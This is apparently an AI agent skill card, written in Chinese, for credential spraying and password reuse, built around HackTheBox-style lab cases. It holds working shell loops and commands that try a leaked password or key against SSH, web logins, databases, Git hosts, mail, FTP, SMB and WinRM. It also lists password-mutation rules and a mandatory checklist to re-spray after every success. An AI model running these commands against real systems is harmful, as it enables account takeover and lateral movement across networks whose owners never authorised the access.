---
name: 'credential-spraying-password-reuse'
description: '凭据喷洒方法论：拿到密码/疑似凭据后横向测试所有服务的强制流程（🆕 疑似凭据先喷后判 + Principal 案例）'
whenToUse: '拿到任何密码/哈希/疑似凭据后，准备横向复用测试之前'
metadata: { domain: creds, tier: T1 }
---
> 📌 DSH 用法：用 skill 工具按名加载本卡。

# 凭据喷洒 / 密码复用攻击

> 🔴 **拿到任何密码/哈希的第一反应：不是在原地猜下一个，而是拿这个密码去试所有其他地方。**

## 核心原则

```text
一个密码出现的位置 ≠ 它唯一有效的位置

DB 密码 → 试 Web 登录
Web 密码 → 试 SSH
.env 凭据 → 试所有系统用户
Git 历史密码 → 试当前服务
内部服务密码 → 试外部服务
🆕 疑似凭据（配置字段泄露的值）→ 同样立即全服务喷洒，不要先判断"它像什么"
```text

> 🆕 **疑似凭据 = 任何看起来像密码/密钥的泄露值**（encryptionKey、API key、token、passphrase 命名字段）。即使它在 settings/配置里显示为"加密密钥"，也可能就是某个系统用户的密码。**先喷后判**，判断留给喷洒结果。

## Nexus 案例 — 密码复用链（经典）

```yaml
找到: Git 历史泄露 DB_PASSWORD=N27xh!!2ucY04
  ├── ✅ Krayin CRM 登录 (j.matthew@nexus.htb)  ← 同一个密码！
  ├── ❌ SSH j.matthew                          ← 不是这个
  └── ❌ Gitea admin                            ← 不是这个

找到: .env 生产配置 DB_PASSWORD=y27xb3ha!!74GbR
  ├── ✅ SSH jones                              ← 系统用户密码
  ├── ✅ Gitea jones                            ← 同一个密码！
  └── ✅ j.matthew@nexus.htb = jones            ← 同一个人！
```text

## 🆕 Principal 案例 — 疑似凭据先喷 SSH（教训）

```yaml
找到: /api/settings 泄露 encryptionKey=D3pl0y_$$H_Now42! (名字像加密密钥)
  ├── ❌ HTTP 登录喷洒 8 用户          ← 先试了 Web，全失败 → 差点标记死路
  ├── ❌ HS256 JWT 伪造               ← 又试了签名，失败
  ├── ❌ 各种 API fuzz (7789 词)      ← Web 面穷举，全 404
  └── ✅ SSH svc-deploy               ← 最后才试 SSH，一发命中！
      （谐音提示: "D3pl0y $$H Now42" = Deploy SSH Now42）

代价: 若第一时间 SSH 喷洒可省 30-40 分钟 Web 死角探索
```text

## 喷洒清单（拿到密码后逐项执行）

### 1. SSH — 所有已知系统用户（🔴 最高优先级，最快见效）
```bash
for user in $(cat /etc/passwd | grep -E 'bash|sh$' | cut -d: -f1); do
    sshpass -p "$PASSWORD" ssh -o ConnectTimeout=3 $user@target 'id' 2>/dev/null
done
# 或针对已知用户名:
for u in admin svc-deploy operator ...; do sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no $u@IP id 2>&1 | grep -v "Permission denied"; done
```text

### 2. Web 登录 — 所有已知 Web 应用
```bash
# 每个 vhost/子域
for email in admin@domain user@domain; do
    curl -s -c cookie.txt -X POST "https://app.domain/login" \
        -d "email=$email&password=$PASSWORD"
done
```text

### 3. 数据库 — 所有数据库用户
```bash
mysql -u root -p$PASSWORD -e "SELECT 1"
mysql -u admin -p$PASSWORD -e "SELECT 1"
mysql -u <app_name> -p$PASSWORD -e "SELECT 1"
# PostgreSQL
PGPASSWORD=$PASSWORD psql -U postgres -c "SELECT 1"
# MSSQL
impacket-mssqlclient <user>:$PASSWORD@<target>
```text

### 4. Git/代码托管 — 所有用户
```bash
# Gitea
curl -s -c cookie http://git.target/user/login -d "user_name=$USER&password=$PASSWORD"
# GitLab
curl -s "https://gitlab.target/api/v4/user" -H "PRIVATE-TOKEN: $PASSWORD"
# GitHub
curl -s -u "$USER:$PASSWORD" https://api.github.com/user
```text

### 5. 邮件/IMAP/POP3
```bash
curl -s imaps://mail.target -u "$USER:$PASSWORD"
```text

### 6. 其他常见服务
```bash
# FTP
(echo "user $USER"; echo "$PASSWORD"; echo quit) | ftp -n target
# SMB
smbclient -U "$USER%$PASSWORD" //target/share
# WinRM / RDP
evil-winrm -u $USER -p $PASSWORD -i target
```text

## 密码变体 — 不要只试原密码

```bash
ORIGINAL="N27xh!!2ucY04"

# 常见变体策略:
# 1. 大小写变体
N27xh!!2ucY04 → n27xh!!2ucy04

# 2. 数字替换
N27xh!!2ucY04 → N27xh!!2ucY04! → N27xh!!2ucY04@

# 3. 公司/产品名组合
N27xh!!2ucY04 → NexusN27xh!! → KrayinN27xh!!

# 4. 季度/年份后缀
N27xh!!2ucY04 → N27xh!!2ucY04@2026 → N27xh!!2ucY04#Q1

# 5. 常见模式
→ 同密码但不同用户名: admin, root, <service_name>
→ 去掉特殊字符: N27xh2ucY04
→ 去特殊字符并截断: N27xh2uc
```text

## 密码来源优先级

| 优先级 | 来源 | 为什么 |
|--------|------|--------|
| 🔴 1 | `.env` / 配置文件 | 生产密码，最可能复用 |
| 🔴 2 | Git 历史 commit diff | 旧密码，但可能仍在别处使用 |
| 🔴 3 | 数据库用户表 | 哈希需要破解，但可能就是系统密码 |
| 🟠 4 | 日志文件 | 可能包含明文密码 |
| 🟠 5 | 注释/文档 | 开发人员留下的"临时"密码 |
| 🟡 6 | web 源码硬编码 | API key / token 常被复用 |
| 🆕 🟠 7 | 配置泄露字段 (settings/env 里的 key 名字段) | 疑似凭据，先喷后判 |

## 防止遗漏的强制流程

```text
[ ] 密码已记录到文件（去交互化）
[ ] 🔴 疑似凭据（配置字段泄露值）已当密码对待，先喷洒再判断用途
[ ] 密码已对 /etc/passwd 中所有有 shell 的用户尝试
[ ] 密码已对所有已知 Web 应用尝试
[ ] 密码已对所有数据库用户尝试
[ ] 密码已对所有 Git/代码托管用户尝试
[ ] 密码已对常见端口服务尝试 (21, 22, 445, 3389, 5985, 3306, 5432, 1433)
[ ] 密码的 5 种变体已尝试
[ ] 🔴 以上有一项成功 → 重新开始喷洒（新用户/新服务可能有新密码）
```text

## 教训

1. **密码复用是常态，不是例外** — 特别是在内网/开发环境
2. **DB 密码 ≠ 只能在 DB 用** — 开发/运维常用同一个密码注册所有服务
3. **Git 历史中的旧密码 ≠ 无用** — 用户可能改了 DB 密码但忘了改 CRM 密码
4. **一个密码成功 → 立即广度优先喷洒** — 不要垂直深入，先横向测所有服务
5. **用户名和邮箱地址映射** — j.matthew@nexus.htb = jones (系统用户) = jones (Gitea 用户)
6. 🆕 **疑似凭据先喷后判** — settings/env 里命名字段（encryptionKey/passphrase/apiKey）泄露的值，第一件事是喷 SSH + 全部服务，不是分析它"是什么的密钥"（Principal 教训: encryptionKey = svc-deploy SSH 密码）
